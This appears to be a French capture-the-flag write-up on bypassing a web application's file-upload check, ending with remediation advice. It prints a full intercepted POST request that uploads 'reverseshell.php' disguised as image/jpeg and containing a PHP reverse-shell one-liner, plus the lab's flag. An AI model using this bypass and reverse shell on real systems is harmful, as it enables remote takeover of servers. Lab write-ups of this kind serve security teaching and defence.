# Upload exploit 

## Exploitation

Lors d'un upload de fichier la requete POST qui suit comprend plusieurs parametres qui sont checkés tels que :
	filename 
	Content-Type
	le magic-byte

Pour bypass un upload de fichier nous allons avoir besoin de BurpSuite pour interrompre l'envoi de la requete et la modifier a la volée
On changeras le contenu de l'image pour y mettre du code en php (par exemple) et on garderas le Content-Type de facon a ce que le serveur croie recevoir une image.

http://192.168.122.55/?page=upload

request :
```
POST /?page=upload HTTP/1.1
Host: 192.168.122.55
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------118712806221434122761445428627
Content-Length: 545
Origin: http://192.168.122.55
Connection: close
Referer: http://192.168.122.55/?page=upload
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1

-----------------------------118712806221434122761445428627
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
-----------------------------118712806221434122761445428627
Content-Disposition: form-data; name="uploaded"; filename="reverseshell.php"
Content-Type: image/jpeg

php -r '$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

-----------------------------118712806221434122761445428627
Content-Disposition: form-data; name="Upload"

Upload
-----------------------------118712806221434122761445428627--
```

response :
```
<pre>
<center>
	<h2 style="margin-top:50px;">
	The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
	</h2>
<br/>
<img src="images/win.png" alt="" width=200px height=200px>
</center>
</pre>
<pre>
	/tmp/index.php succesfully uploaded.
</pre>
```

## Resolution

Restreindre les types de fichiers acceptés pour le téléchargement: 
	- vérifiez l'extension du fichier et autorisez uniquement le téléchargement de certains fichiers. 
	- Utilisez une approche de liste blanche au lieu d'une liste noire. 
	- Recherchez les extensions doubles telles que .php.png. 
	- Recherchez les fichiers sans nom de fichier comme .htaccess (sur ASP.NET, recherchez les fichiers de configuration comme web.config). 
	- Modifiez les autorisations sur le dossier de téléchargement afin que les fichiers qu'il contient ne soient pas exécutables. 
	- Si possible, renommez les fichiers téléchargés.
